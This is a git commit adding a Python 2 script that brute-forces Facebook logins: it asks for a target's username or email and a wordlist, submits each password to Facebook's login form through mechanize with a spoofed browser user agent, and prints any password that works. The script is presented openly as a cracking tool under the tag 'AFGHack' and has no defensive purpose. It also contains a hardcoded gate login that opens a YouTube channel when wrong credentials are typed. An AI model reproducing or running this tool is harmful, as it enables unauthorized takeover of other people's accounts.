87147f9d45a8826975499b057ba2b9cee173209c
Edris Nabizada <76719529+edrianabizada@users.noreply.github.com>
2021-08-17 21:11:27 +0430

    Add files via upload

---
+++ Edris_Na.py
@@ -0,0 +1,94 @@
+#!/usr/bin/python
+# -*- coding: utf-8 -*-
+#Edris_Nabizada    
+        
+        #############################################
+        #                                           #
+        #    Facebook BruteForce, by https://www.facebook.com/profile.php?id=🖕🖕🖕🖕🖕🖕    #
+        #    telegram Contact:       🖕🖕🖕🖕🖕🖕🖕🖕🖕    #
+        #                                           #
+        #############################################
+CorrectUsername = "Edris"
+CorrectPassword = "Nabizada"
+
+loop = 'true'
+while (loop == 'true'):
+    username = raw_input("\033[1;96m[] \033[1;91mUSERNAME \x1b[1;96m>>>> ")
+    if (username == CorrectUsername):
+    	password = raw_input("\033[1;96m[] \033[1;91mPASSWORD \x1b[1;96m>>>> ")
+        if (password == CorrectPassword):
+            print "Logged in successfully as " + username #Dev:AMiR BabeR
+            loop = 'false'
+        else:
+            print "Serious Please"
+            os.system('xdg-open https://www.youtube.com/channel/UCUuLWMHEyrtIRxAS1HR45uw')
+    else:
+        print "Wrong Dear!"
+        os.system('xdg-open https://www.youtube.com/channel/UCUuLWMHEyrtIRxAS1HR45uw')
+
+####login#########
+
+import time
+import os
+
+os.system('clear')
+time.sleep(0.5)
+try:
+    import mechanize
+except ModuleNotFoundError:
+    print '[!] Module >Mechanize< Not Found!\n    This module is only available in python 2.x :/\n    Please install mechanize (pip install mechanize) and run the program with python2'
+    exit()
+
+time.sleep(0.5)
+user = raw_input('[?] Target Username/ID/Email >>> ')
+time.sleep(0.8)
+wrdlstFileName = raw_input('\n[?] Wordlist Directory >>> ')
+try:
+    wordlist = open(wrdlstFileName, 'r')
+except FileNotFoundError:
+    print ('\n[!] File Not Found!')
+    exit()
+
+time.sleep(0.8)
+print '\n\nCracking '+user+' Now...'
+
+time.sleep(1)
+print '\n###############Edris_Nabizada AFGHack##############\n'
+for password in wordlist:
+    if password == '' or password == ' ':
+        pass
+    else:
+        try:
+            browser = mechanize.Browser()
+            browser.set_handle_robots(False)
+            browser.addheaders = [('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
+            fb = browser.open('https://facebook.com')
+            dos = open('Facebook-Log.txt', 'w+')
+            browser.select_form(nr=0)
+            browser.form['email'] = user
+            browser.form['pass'] = password
+            browser.method = 'POST'
+            browser.submit()
+            dos.write(browser.open('https://facebook.com').read())
+            dos.seek(0)
+            text = dos.read().decode('UTF-8')
+            if text.find('home_icon', 0, len(text)) != -1:
+                print '[+] Password Found > '+password 
+                dos.close()
+                os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+                exit()
+            else:
+                print "[!] Wrong Password! > "+str(password)
+        except KeyboardInterrupt:
+            print '\n#############################################\n   Exiting..'
+            dos.close()
+            os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+            exit()
+
+time.sleep(1)
+print 'Sorry, none of the passswords in your wordlist is right.'
+time.sleep(0.8)
+dos.close()
+os.system('rm Facebook-Log.txt || del Facebook-Log.txt')
+exit()
+
